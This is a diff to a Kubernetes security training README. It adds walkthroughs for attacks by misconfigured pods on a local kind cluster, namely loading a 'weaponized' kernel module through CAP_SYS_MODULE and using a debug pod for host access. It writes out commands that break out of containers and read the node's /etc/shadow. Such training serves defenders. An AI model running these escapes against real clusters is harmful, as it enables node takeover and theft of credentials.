@@ -4,6 +4,22 @@
 > <br/>
 > This folder contains a collection of pods that are examples of various attacks on Kubernetes clusters using misconfigured pods. These **should never** be deployed in any environment outside of the context of this training.
 
+## Setup
+
+For these examples, we will use a single kind cluster with a specific configuration.
+
+1. Delete any previous clusters
+
+```bash
+kind delete clusters --all
+```
+
+2. Create our victim cluster
+
+```bash
+kind create cluster --config cluster.yaml
+```
+
 ## 01-privileged-pod
 
 This example shows how a pod with a privileged security context and hostPID can breakout of the container and access the root filesystem. This is done using the _official_ alpine image with no modifications. To perform this exploit:
@@ -52,4 +68,60 @@ ln -s / /host/var/log/root_link
 4. Access the host `/etc/shadow` file
 ```
 cat /host/var/log/root_link/etc/shadow
+```
+
+## 03-add-capabilities
+
+This example is extremely nasty. We showcase how a pod which was able to add system capabilities, in this case `CAP_SYS_MODULE`, was able to use the official `nginx` container, with a malicious kernel module bundled into it, is able to install the module **on the kubernetes node kernel** to execute any code at [ring 0](https://en.wikipedia.org/wiki/Protection_ring).
+
+1. Build the weaponized container image
+```bash
+docker build -t nginx:weaponized 03-add-capabilities/image/
+```
+
+2. Load our weaponized container image into the kind cluster containerd
+```bash
+kind load docker-image nginx:weaponized
+```
+
+3. Deploy the weaponized nginx
+```bash
+kubectl apply -f 03-add-capabilities/add-capabilities.yaml
+```
+
+4. Check application
+```bash
+curl -sL http://localhost
+```
+
+5. Look at the kind node kernel logs
+```bash
+docker exec kind-control-plane dmesg | grep Module
+```
+
+6. Check to see loaded modules on the host
+
+```bash
+sudo lsmod | grep Totally_Legit_Module
+```
+
+7. (cleanup) Remove the loaded kernel module
+```bash
+sudo rmmod Totally_Legit_Module
+```
+
+## 04-debug-pod
+
+This is less an example about a weaponized pod, and more highlighting the security considerations and implications related to [kubernetes debug containers](https://kubernetes.io/blog/2026/03/18/securing-production-debugging-in-kubernetes/)
+
+1. Use a kubernetes debug pod to get host access to a node. Yes its this easy.
+
+```bash
+kubectl debug node/kind-control-plane -it --image=alpine --profile=sysadmin
+```
+
+2. Access the host /etc/shadow
+
+```bash
+cat /host/etc/shadow
 ```
